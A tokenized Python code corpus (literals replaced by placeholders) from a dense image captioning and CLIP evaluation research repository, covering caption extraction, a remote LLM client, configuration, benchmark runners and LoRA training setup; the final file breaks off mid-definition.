] <EOL> width = crop_dims [ '<STR_LIT>' ] [ '<STR_LIT>' ] - crop_dims [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> height = crop_dims [ '<STR_LIT>' ] [ '<STR_LIT>' ] - crop_dims [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> w_pad_int = int ( width * pad_amount ) <EOL> h_pad_int = int ( height * pad_amount ) <EOL> cx1 = max ( crop_dims [ '<STR_LIT>' ] [ '<STR_LIT>' ] - w_pad_int , x1 ) <EOL> cy1 = max ( crop_dims [ '<STR_LIT>' ] [ '<STR_LIT>' ] - h_pad_int , y1 ) <EOL> cx2 = min ( crop_dims [ '<STR_LIT>' ] [ '<STR_LIT>' ] + w_pad_int , x2 ) <EOL> cy2 = min ( crop_dims [ '<STR_LIT>' ] [ '<STR_LIT>' ] + h_pad_int , y2 ) <EOL> return base_image [ cy1 : cy2 , cx1 : cx2 ] <EOL> def get_base_caption ( self ) -> List [ DCIEntry ] : <EOL> return [ <EOL> { '<STR_LIT>' : self . get_image ( ) , '<STR_LIT>' : self . _data [ '<STR_LIT>' ] , '<STR_LIT>' : '<STR_LIT>' } <EOL> ] <EOL> def get_extended_caption ( self ) -> List [ DCIEntry ] : <EOL> caption = f"<STR_LIT>" <EOL> return [ <EOL> { '<STR_LIT>' : self . get_image ( ) , '<STR_LIT>' : caption , '<STR_LIT>' : '<STR_LIT>' } <EOL> ] <EOL> def get_formatted_description_min_size ( self , min_height = <NUM_LIT> , min_width = <NUM_LIT> ) -> List [ DCIEntry ] : <EOL> base_caption = f"<STR_LIT>" <EOL> masks = self . filter_masks_by_size ( min_height = min_height , min_width = min_width ) <EOL> captions = [ self . _extract_caption ( m ) for m in masks ] <EOL> captions = [ c for c in captions if c is not None ] <EOL> all_captions = "<STR_LIT>" . join ( captions ) <EOL> if len ( captions ) > <NUM_LIT> : <EOL> caption = f"<STR_LIT>" <EOL> else : <EOL> caption = base_caption <EOL> return [ <EOL> { '<STR_LIT>' : self . get_image ( ) , '<STR_LIT>' : caption , '<STR_LIT>' : '<STR_LIT>' } <EOL> ] <EOL> def get_formatted_complete_description ( self ) -> List [ DCIEntry ] : <EOL> return self . get_formatted_description_min_size ( min_height = <NUM_LIT> , min_width = <NUM_LIT> ) <EOL> def get_positive_mask_samples ( <EOL> self , <EOL> min_height : int = <NUM_LIT> , <EOL> min_width : int = <NUM_LIT> , <EOL> min_length : int = <NUM_LIT> , <EOL> max_length : Optional [ int ] = None <EOL> ) -> List [ DCIEntry ] : <EOL> masks = self . filter_masks_by_size ( <EOL> min_height = min_height , min_width = min_width , min_length = min_length , max_length = max_length <EOL> ) <EOL> return [ <EOL> { <EOL> '<STR_LIT>' : self . get_subimage ( mask ) , <EOL> '<STR_LIT>' : self . _extract_caption ( mask ) , <EOL> '<STR_LIT>' : f'<STR_LIT>' <EOL> } for mask in masks <EOL> ] <EOL> </s>
<s> import json <EOL> import math <EOL> from typing import List , Dict , Any <EOL> import requests <EOL> from fastchat . model . model_adapter import get_conversation_template <EOL> from long_captions . utils import get_clip_token_length <EOL> from long_captions . dense_image import DenseCaptionedImage , MaskDataEntry <EOL> ALTER_PROMPTS = { <EOL> '<STR_LIT>' : ( <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> ) , <EOL> '<STR_LIT>' : ( <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> ) , <EOL> '<STR_LIT>' : ( <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> ) <EOL> } <EOL> MULTI_CAPTION_PROMPT = ( <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> ) <EOL> class RemoteLanguageModel : <EOL> def __init__ ( <EOL> self , <EOL> model_path : str , <EOL> worker_addr : str = "<STR_LIT>" , <EOL> debug : bool = False <EOL> ) -> None : <EOL> self . model_path = model_path <EOL> self . worker_addr = worker_addr <EOL> self . debug = debug <EOL> def generate ( <EOL> self , <EOL> message : str , <EOL> system : str = None , <EOL> temperature : float = <NUM_LIT> , <EOL> max_new_tokens : int = <NUM_LIT> <EOL> ) -> Dict [ str , Any ] : <EOL> conv = get_conversation_template ( self . model_path ) <EOL> if system is not None : <EOL> conv . system_message = f"<STR_LIT>" <EOL> conv . append_message ( conv . roles [ <NUM_LIT> ] , message ) <EOL> conv . append_message ( conv . roles [ <NUM_LIT> ] , None ) <EOL> prompt = conv . get_prompt ( ) <EOL> if self . debug : <EOL> print ( prompt ) <EOL> headers = { "<STR_LIT>" : "<STR_LIT>" } <EOL> gen_params = { <EOL> "<STR_LIT>" : self . model_path , <EOL> "<STR_LIT>" : prompt , <EOL> "<STR_LIT>" : temperature , <EOL> "<STR_LIT>" : max_new_tokens , <EOL> "<STR_LIT>" : conv . stop_str , <EOL> "<STR_LIT>" : conv . stop_token_ids , <EOL> "<STR_LIT>" : False , <EOL> } <EOL> response = requests . post ( <EOL> self . worker_addr + "<STR_LIT>" , <EOL> headers = headers , <EOL> json = gen_params <EOL> ) <EOL> return json . loads ( response . text ) <EOL> def get_short_enough_full_caption ( self , dci : DenseCaptionedImage , tok_bound = <NUM_LIT> ) -> str : <EOL> full_caption = dci . get_formatted_complete_description ( ) [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> while get_clip_token_length ( full_caption ) > tok_bound : <EOL> full_caption = "<STR_LIT>" . join ( full_caption . split ( "<STR_LIT>" ) [ : - <NUM_LIT> ] ) <EOL> return full_caption <EOL> def get_extracted_captions ( self , resp ) -> List [ str ] : <EOL> _ , content = resp . split ( "<STR_LIT>" ) <EOL> c1 , content = content . split ( "<STR_LIT>" ) <EOL> c2 , content = content . split ( "<STR_LIT>" ) <EOL> c3 , content = content . split ( "<STR_LIT>" ) <EOL> c4 , content = content . split ( "<STR_LIT>" ) <EOL> c5 = content . split ( "<STR_LIT>" ) [ <NUM_LIT> ] <EOL> return [ c1 . strip ( ) , c2 . strip ( ) , c3 . strip ( ) , c4 . strip ( ) , c5 . strip ( ) ] <EOL> def get_new_captions_for_dci ( <EOL> self , dci : DenseCaptionedImage , <EOL> max_len = <NUM_LIT> , target_count = <NUM_LIT> , max_retry = <NUM_LIT> ) -> List [ str ] : <EOL> new_captions = [ ] <EOL> full_caption = self . get_short_enough_full_caption ( dci ) <EOL> while len ( new_captions ) < target_count and max_retry > <NUM_LIT> : <EOL> max_retry -= <NUM_LIT> <EOL> try : <EOL> message = f"<STR_LIT>" <EOL> res = self . generate ( <EOL> message = message , <EOL> system = MULTI_CAPTION_PROMPT , <EOL> max_new_tokens = <NUM_LIT> , <EOL> ) <EOL> for c in self . get_extracted_captions ( res [ '<STR_LIT>' ] ) : <EOL> if get_clip_token_length ( c ) < max_len : <EOL> new_captions . append ( c ) <EOL> except : <EOL> pass <EOL> assert len ( new_captions ) > target_count <EOL> return new_captions <EOL> def get_short_enough_mask_caption ( <EOL> self , dci : DenseCaptionedImage , <EOL> mask : MaskDataEntry , tok_bound = <NUM_LIT> ) -> str : <EOL> depth = dci . _get_max_depth ( mask ) <EOL> caption_length = <NUM_LIT> <EOL> while caption_length > tok_bound : <EOL> full_caption = dci . get_caption_with_subcaptions ( mask , max_depth = depth ) [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> depth -= <NUM_LIT> <EOL> caption_length = get_clip_token_length ( full_caption ) <EOL> return full_caption <EOL> def get_new_captions_for_mask ( <EOL> self , dci : DenseCaptionedImage , <EOL> mask : MaskDataEntry , max_len = <NUM_LIT> , <EOL> target_count = None , max_retry = <NUM_LIT> ) -> list [ str ] : <EOL> mask_subcaption = self . get_short_enough_mask_caption ( dci , mask ) <EOL> caption_length = get_clip_token_length ( mask_subcaption ) <EOL> if target_count is None : <EOL> target_count = max ( <NUM_LIT> , math . log ( caption_length ) ) <EOL> new_captions = [ ] <EOL> while len ( new_captions ) < target_count and max_retry > <NUM_LIT> : <EOL> max_retry -= <NUM_LIT> <EOL> try : <EOL> message = f"<STR_LIT>" <EOL> res = self . generate ( <EOL> message = message , <EOL> system = MULTI_CAPTION_PROMPT , <EOL> max_new_tokens = <NUM_LIT> , <EOL> ) <EOL> for c in self . get_extracted_captions ( res [ '<STR_LIT>' ] ) : <EOL> if get_clip_token_length ( c ) < max_len : <EOL> new_captions . append ( c ) <EOL> except : <EOL> pass <EOL> assert len ( new_captions ) > target_count <EOL> return new_captions <EOL> def get_summary ( self , message : str , short = False ) : <EOL> if not short : <EOL> SYSTEM_PROMPT = ( <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> ) <EOL> else : <EOL> SYSTEM_PROMPT = ( <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> ) <EOL> res = self . generate ( message , system = SYSTEM_PROMPT , max_new_tokens = <NUM_LIT> ) <EOL> if "<STR_LIT>" in res [ '<STR_LIT>' ] : <EOL> assert "<STR_LIT>" not in res [ '<STR_LIT>' ] [ <NUM_LIT> : ] , f"<STR_LIT>" <EOL> res [ '<STR_LIT>' ] = res [ '<STR_LIT>' ] . split ( "<STR_LIT>" ) [ - <NUM_LIT> ] <EOL> return res [ '<STR_LIT>' ] . strip ( ) <EOL> def get_negative ( self , message : str , negative_type = '<STR_LIT>' ) : <EOL> alter_prompt = ALTER_PROMPTS [ negative_type ] <EOL> res = self . generate ( message , system = alter_prompt , max_new_tokens = <NUM_LIT> ) <EOL> if "<STR_LIT>" in res [ '<STR_LIT>' ] : <EOL> assert "<STR_LIT>" not in res [ '<STR_LIT>' ] [ <NUM_LIT> : ] , f"<STR_LIT>" <EOL> res [ '<STR_LIT>' ] = res [ '<STR_LIT>' ] . split ( "<STR_LIT>" ) [ - <NUM_LIT> ] <EOL> return res [ '<STR_LIT>' ] . strip ( ) <EOL> def reduce_length ( self , message : str , target_tokens = <NUM_LIT> , failures = <NUM_LIT> ) : <EOL> last_len = get_clip_token_length ( message ) <EOL> while ( last_len ) > target_tokens : <EOL> print ( f"<STR_LIT>" , end = '<STR_LIT>' , flush = True ) <EOL> if last_len - target_tokens < <NUM_LIT> : <EOL> ALTER_PROMPT = ( <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> ) <EOL> else : <EOL> ALTER_PROMPT = ( <EOL> "<STR_LIT>" <EOL> "<STR_LIT>" <EOL> ) <EOL> res = self . generate ( message , system = ALTER_PROMPT , max_new_tokens = <NUM_LIT> ) <EOL> new_len = get_clip_token_length ( res [ '<STR_LIT>' ] . strip ( ) ) <EOL> if new_len >= last_len or "<STR_LIT>" in res [ '<STR_LIT>' ] : <EOL> assert failures > <NUM_LIT> , f"<STR_LIT>" <EOL> failures -= <NUM_LIT> <EOL> else : <EOL> last_len = new_len <EOL> message = res [ '<STR_LIT>' ] . strip ( ) <EOL> return message <EOL> </s>
<s> import os <EOL> import yaml <EOL> DENSE_CAPS_DATASET_PACKAGE_DIR = os . path . dirname ( os . path . dirname ( os . path . dirname ( __file__ ) ) ) <EOL> DENSE_CAPS_DIR = os . path . dirname ( DENSE_CAPS_DATASET_PACKAGE_DIR ) <EOL> CONFIG_FILE = os . path . join ( DENSE_CAPS_DATASET_PACKAGE_DIR , '<STR_LIT>' ) <EOL> def init_config ( ) : <EOL> config = { '<STR_LIT>' : True } <EOL> print ( "<STR_LIT>" ) <EOL> default_data_dir = os . path . join ( DENSE_CAPS_DIR , '<STR_LIT>' ) <EOL> data_dir = input ( f"<STR_LIT>" ) <EOL> if data_dir . strip ( ) == "<STR_LIT>" : <EOL> config [ '<STR_LIT>' ] = default_data_dir <EOL> else : <EOL> config [ '<STR_LIT>' ] = data_dir . strip ( ) <EOL> with open ( CONFIG_FILE , '<STR_LIT>' ) as config_file : <EOL> yaml . dump ( config , config_file ) <EOL> return config <EOL> def get_config ( ) : <EOL> if not os . path . exists ( CONFIG_FILE ) : <EOL> return init_config ( ) <EOL> with open ( CONFIG_FILE , '<STR_LIT>' ) as config_file : <EOL> config = yaml . safe_load ( config_file ) <EOL> return config <EOL> DCI_CONFIG = get_config ( ) <EOL> DATASET_BASE = os . path . join ( DCI_CONFIG [ '<STR_LIT>' ] , '<STR_LIT>' ) <EOL> MODEL_BASE = os . path . join ( DENSE_CAPS_DIR , '<STR_LIT>' ) <EOL> DATASET_PHOTO_PATH = os . path . join ( DATASET_BASE , '<STR_LIT>' ) <EOL> DATASET_ANNOTATIONS_PATH = os . path . join ( DATASET_BASE , '<STR_LIT>' ) <EOL> DATASET_COMPLETE_PATH = os . path . join ( DATASET_BASE , '<STR_LIT>' ) <EOL> </s>
<s> import torch <EOL> import numpy as np <EOL> from tqdm import tqdm <EOL> class AROtoHFCLIPWrap ( ) : <EOL> def __init__ ( self , model , processor , device = None ) : <EOL> self . model = model <EOL> self . processor = processor <EOL> if device is None : <EOL> device = model . device <EOL> self . device = device <EOL> @ torch . no_grad ( ) <EOL> def process_batch ( self , b ) : <EOL> width = len ( b [ '<STR_LIT>' ] ) <EOL> bs = len ( b [ '<STR_LIT>' ] [ <NUM_LIT> ] ) <EOL> all_entries = [ ] <EOL> for cap_tuple in b [ '<STR_LIT>' ] : <EOL> all_entries += list ( cap_tuple ) <EOL> entries_tokenized = self . processor . tokenizer ( all_entries , return_tensors = '<STR_LIT>' , padding = True ) . to ( self . device ) <EOL> pixel_values = b [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] [ <NUM_LIT> ] <EOL> all_logits = self . model ( input_ids = entries_tokenized [ '<STR_LIT>' ] , attention_mask = entries_tokenized [ '<STR_LIT>' ] , pixel_values = pixel_values . to ( self . device ) ) <EOL> def do_keep ( a ) : <EOL> rowsize = width * bs <EOL> curr_row = a // rowsize <EOL> curr_col = a % bs <EOL> return curr_col == curr_row <EOL> index_np = np . arange ( width * bs * bs ) . reshape ( ( bs , width * bs ) ) <EOL> grouped = all_logits . logits_per_image . cpu ( ) . numpy ( ) [ do_keep ( index_np ) ] <EOL> scores = grouped . reshape ( ( bs , <NUM_LIT> , width ) ) <EOL> return scores <EOL> @ torch . no_grad ( ) <EOL> def get_retrieval_scores_batched ( self , joint_loader ) : <EOL> scores = [ ] <EOL> tqdm_loader = tqdm ( joint_loader ) <EOL> tqdm_loader . set_description ( "<STR_LIT>" ) <EOL> for batch in tqdm_loader : <EOL> batch_score = self . process_batch ( batch ) <EOL> scores . append ( batch_score ) <EOL> all_scores = np . concatenate ( scores , axis = <NUM_LIT> ) <EOL> return all_scores <EOL> </s>
<s> import torch <EOL> import os <EOL> import sys <EOL> from densely_captioned_images . repro . config import MODEL_PATH , ELEVATER_MODEL_CONFIG , ELEVATER_DATASET_CONFIG_ROOT , ELEVATER_DATASET_ROOT , EVAL_LOG_PATH <EOL> from densely_captioned_images . repro . eval . ElevaterIC . vision_benchmark . commands . linear_probe import main as linear_probe <EOL> from densely_captioned_images . repro . eval . ElevaterIC . vision_benchmark . commands . zeroshot import main as zeroshot <EOL> DATASETS_LIST = [ <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' <EOL> ] <EOL> DATASETS_NAME_MAP = { <EOL> '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> SHOT_OPTIONS = [ <EOL> <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , - <NUM_LIT> <EOL> ] <EOL> def run_elevater_on ( <EOL> model , <EOL> path_key , <EOL> run_full = False , <EOL> do_finetune = True , <EOL> shot_options = None , <EOL> dataset_option = None , <EOL> ) : <EOL> submodel_path = os . path . join ( MODEL_PATH , path_key , '<STR_LIT>' ) <EOL> if not os . path . exists ( submodel_path ) : <EOL> torch . save ( model . state_dict ( ) , submodel_path ) <EOL> run_elevater ( <EOL> submodel_path , <EOL> path_key , <EOL> run_full = run_full , <EOL> do_finetune = do_finetune , <EOL> shot_options = shot_options , <EOL> dataset_option = dataset_option , <EOL> ) <EOL> def run_elevater ( <EOL> model_path , <EOL> path_key , <EOL> run_full = False , <EOL> do_finetune = True , <EOL> shot_options = None , <EOL> rerun_existing = False , <EOL> dataset_option = None <EOL> ) : <EOL> if shot_options is None : <EOL> shot_options = SHOT_OPTIONS <EOL> use_datasets = DATASETS_LIST <EOL> if dataset_option is not None : <EOL> use_datasets = [ use_datasets [ dataset_option ] ] <EOL> if run_full is False : <EOL> shot_options = shot_options [ : <NUM_LIT> ] <EOL> use_datasets = use_datasets [ : <NUM_LIT> ] <EOL> def dataset_already_run_for_all_shots ( d ) : <EOL> for shot in shot_options : <EOL> if shot == <NUM_LIT> : <EOL> subpath = "<STR_LIT>" <EOL> elif shot == - <NUM_LIT> : <EOL> subpath = '<STR_LIT>' <EOL> else : <EOL> subpath = f'<STR_LIT>' <EOL> full_path = os . path . join ( EVAL_LOG_PATH , '<STR_LIT>' , path_key , '<STR_LIT>' , subpath ) <EOL> if not os . path . exists ( full_path ) : <EOL> return False <EOL> all_tasks = '<STR_LIT>' . join ( os . listdir ( full_path ) ) <EOL> if DATASETS_NAME_MAP [ d ] not in all_tasks : <EOL> return False <EOL> return True <EOL> if not rerun_existing : <EOL> use_datasets = [ d for d in use_datasets if not dataset_already_run_for_all_shots ( d ) ] <EOL> print ( f"<STR_LIT>" ) <EOL> os . makedirs ( f'<STR_LIT>' , exist_ok = True ) <EOL> for dataset in use_datasets : <EOL> for num_shots in shot_options : <EOL> if num_shots != <NUM_LIT> : <EOL> args_list = [ <EOL> '<STR_LIT>' , ELEVATER_MODEL_CONFIG , <EOL> '<STR_LIT>' , f'<STR_LIT>' , <EOL> '<STR_LIT>' , f'<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , f'<STR_LIT>' , <EOL> '<STR_LIT>' , f'<STR_LIT>' , <EOL> '<STR_LIT>' , f'<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , f'<STR_LIT>' , <EOL> ] <EOL> saved_argv = sys . argv <EOL> try : <EOL> sys . argv = [ '<STR_LIT>' ] + args_list <EOL> linear_probe ( ) <EOL> finally : <EOL> sys . argv = saved_argv <EOL> else : <EOL> args_list = [ <EOL> '<STR_LIT>' , ELEVATER_MODEL_CONFIG , <EOL> '<STR_LIT>' , f'<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , f'<STR_LIT>' , <EOL> '<STR_LIT>' , f'<STR_LIT>' , <EOL> '<STR_LIT>' , f'<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , f'<STR_LIT>' , <EOL> ] <EOL> saved_argv = sys . argv <EOL> try : <EOL> sys . argv = [ '<STR_LIT>' ] + args_list <EOL> zeroshot ( ) <EOL> finally : <EOL> sys . argv = saved_argv <EOL> def run_elevator_from_lora_checkpoint ( lora_path_key , run_full = False , shot_options = None ) : <EOL> from transformers import CLIPModel <EOL> from peft import PeftModel <EOL> if shot_option is not None and isinstance ( shot_option , int ) : <EOL> shot_option = [ shot_option ] <EOL> submodel_path = os . path . join ( MODEL_PATH , lora_path_key ) <EOL> base_clip_model = CLIPModel . from_pretrained ( "<STR_LIT>" ) <EOL> loaded = PeftModel . from_pretrained ( base_clip_model , submodel_path ) <EOL> loaded = loaded . merge_and_unload ( ) <EOL> run_elevater_on ( loaded , lora_path_key , run_full = run_full , shot_options = shot_options ) <EOL> if __name__ == '<STR_LIT>' : <EOL> clip_path = os . path . join ( MODEL_PATH , '<STR_LIT>' ) <EOL> if not os . path . exists ( clip_path ) : <EOL> from transformers import CLIPModel <EOL> base_clip_model = CLIPModel . from_pretrained ( "<STR_LIT>" ) <EOL> torch . save ( base_clip_model . state_dict ( ) , clip_path ) <EOL> run_elevater ( clip_path , '<STR_LIT>' , run_full = True , shot_options = [ <NUM_LIT> , <NUM_LIT> ] ) <EOL> </s>
<s> import json <EOL> from densely_captioned_images . dataset . utils import get_clip_token_length <EOL> from densely_captioned_images . repro . config import COCO_TRAIN2017_ANNOTATION_PATH , COCO_VALID2017_ANNOTATION_PATH <EOL> def get_clip_token_lengths_for_coco_split ( split = '<STR_LIT>' ) : <EOL> if split == '<STR_LIT>' : <EOL> annotation_dir = COCO_TRAIN2017_ANNOTATION_PATH <EOL> elif split == '<STR_LIT>' : <EOL> annotation_dir = COCO_VALID2017_ANNOTATION_PATH <EOL> else : <EOL> raise NotImplementedError ( '<STR_LIT>' ) <EOL> with open ( annotation_dir ) as coco_fp : <EOL> coco_annotations = json . load ( coco_fp ) <EOL> caption_count = <NUM_LIT> <EOL> token_count = <NUM_LIT> <EOL> for annotation in coco_annotations [ '<STR_LIT>' ] : <EOL> caption = annotation [ '<STR_LIT>' ] <EOL> caption_count += <NUM_LIT> <EOL> token_count += get_clip_token_length ( caption ) <EOL> return token_count , caption_count , ( token_count / caption_count ) , len ( coco_annotations [ '<STR_LIT>' ] ) <EOL> def get_clip_token_lengths_for_coco ( ) : <EOL> toks , caps , prop , imgs = get_clip_token_lengths_for_coco_split ( '<STR_LIT>' ) <EOL> print ( f"<STR_LIT>" ) <EOL> toks , caps , prop , imgs = get_clip_token_lengths_for_coco_split ( '<STR_LIT>' ) <EOL> print ( f"<STR_LIT>" ) <EOL> if __name__ == '<STR_LIT>' : <EOL> get_clip_token_lengths_for_coco ( ) <EOL> </s>
<s> import submitit <EOL> import os <EOL> from dataclasses import dataclass , field <EOL> import hydra <EOL> from omegaconf import MISSING <EOL> from peft import PeftModel <EOL> from hydra . core . config_store import ConfigStoreWithProvider <EOL> from transformers import CLIPProcessor , CLIPModel <EOL> from densely_captioned_images . dataset . utils import print_trainable_parameters <EOL> from densely_captioned_images . repro . eval . run_aro import run_aro_evals <EOL> from densely_captioned_images . repro . eval . run_vlc import run_vlc_on_model <EOL> from densely_captioned_images . repro . eval . run_winoground import run_winoground <EOL> from densely_captioned_images . repro . eval . run_elevater import run_elevater_on <EOL> from densely_captioned_images . dataset . scripts . run_clip_dense_cap_eval import run_dense_cap_on_model <EOL> from typing import Any , Optional <EOL> HYDRA_CONFIG_PATH = os . path . join ( os . path . dirname ( __file__ ) , '<STR_LIT>' ) <EOL> @ dataclass <EOL> class CLIPEvalConfig ( ) : <EOL> run_aro : bool = field ( <EOL> default = False , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> run_vlc : bool = field ( <EOL> default = False , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> run_dense_cap : bool = field ( <EOL> default = False , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> run_winoground : bool = field ( <EOL> default = False , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> run_elevater : int = field ( <EOL> default = - <NUM_LIT> , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> elevater_dataset : Optional [ int ] = field ( <EOL> default = None , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> lora_weight_location : str = field ( <EOL> default = MISSING , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> model_name : str = field ( <EOL> default = MISSING , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> config = ConfigStoreWithProvider ( "<STR_LIT>" ) <EOL> config . store ( name = "<STR_LIT>" , node = CLIPEvalConfig ) <EOL> class CLIPEvalJob : <EOL> def __call__ ( self , * args , ** kwargs ) : <EOL> run_eval_clip ( args [ <NUM_LIT> ] ) <EOL> def checkpoint ( self , * args : Any , ** kwargs : Any ) -> submitit . helpers . DelayedSubmission : <EOL> return submitit . helpers . DelayedSubmission ( self , * args , ** kwargs ) <EOL> @ hydra . main ( <EOL> config_path = HYDRA_CONFIG_PATH , config_name = "<STR_LIT>" , version_base = "<STR_LIT>" <EOL> ) <EOL> def run_eval_clip ( cfg : CLIPEvalConfig ) : <EOL> print ( '<STR_LIT>' ) <EOL> base_clip_model = CLIPModel . from_pretrained ( "<STR_LIT>" ) <EOL> processor = CLIPProcessor . from_pretrained ( "<STR_LIT>" ) <EOL> print_trainable_parameters ( base_clip_model ) <EOL> print ( f"<STR_LIT>" ) <EOL> loaded = PeftModel . from_pretrained ( base_clip_model , cfg . lora_weight_location ) <EOL> print_trainable_parameters ( loaded ) <EOL> loaded = loaded . merge_and_unload ( ) . to ( '<STR_LIT>' ) <EOL> if cfg . run_aro : <EOL> print ( "<STR_LIT>" ) <EOL> run_aro_evals ( loaded , processor ) <EOL> if cfg . run_vlc : <EOL> print ( "<STR_LIT>" ) <EOL> run_vlc_on_model ( loaded , processor , cfg . model_name ) <EOL> if cfg . run_winoground : <EOL> print ( "<STR_LIT>" ) <EOL> run_winoground ( loaded , processor ) <EOL> if cfg . run_elevater != - <NUM_LIT> : <EOL> print ( f"<STR_LIT>" ) <EOL> run_elevater_on ( <EOL> loaded , <EOL> cfg . model_name , <EOL> run_full = True , <EOL> do_finetune = True , <EOL> shot_options = [ cfg . run_elevater ] , <EOL> dataset_option = cfg . elevater_dataset , <EOL> ) <EOL> if cfg . run_dense_cap : <EOL> print ( "<STR_LIT>" ) <EOL> run_dense_cap_on_model ( loaded , processor ) <EOL> if __name__ == '<STR_LIT>' : <EOL> run_eval_clip ( ) <EOL> </s>
<s> import submitit <EOL> import os <EOL> from dataclasses import dataclass , field <EOL> import hydra <EOL> import math <EOL> from hydra . core . config_store import ConfigStoreWithProvider <EOL> from peft import get_peft_model , LoraConfig <EOL> from transformers import CLIPProcessor , CLIPModel <EOL> from transformers import TrainingArguments <EOL> from densely_captioned_images . repro . train . trainer import compute_metrics , ClipAndNegTrainer <EOL> from densely_captioned_images . dataset . utils import print_trainable_parameters <EOL> from densely_captioned_images . dataset . impl import get_clip_ready_ds <EOL> from densely_captioned_images . repro . train . coco_wrap import COCODataset , get_dataset_source as get_coco_dataset_source <EOL> from densely_captioned_images . repro . train . localized_narratives_wrap import COCOLocalizedNarrativesDataset , get_dataset_source as get_loc_nar_dataset_source <EOL> from densely_captioned_images . repro . config import MODEL_PATH <EOL> from typing import Any <EOL> HYDRA_CONFIG_PATH = os . path . join ( os . path . dirname ( __file__ ) , '<STR_LIT>' ) <EOL> @ dataclass <EOL> class CLIPAndNegConfig ( ) : <EOL> lora_r : int = field ( <EOL> default = <NUM_LIT> , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> lora_alpha : int = field ( <EOL> default = <NUM_LIT> , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> lora_dropout : float = field ( <EOL> default = <NUM_LIT> , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> use_base_images : bool = field ( <EOL> default = True , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> use_subcaptions : bool = field ( <EOL> default = True , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> caption_negative_source : str = field ( <EOL> default = 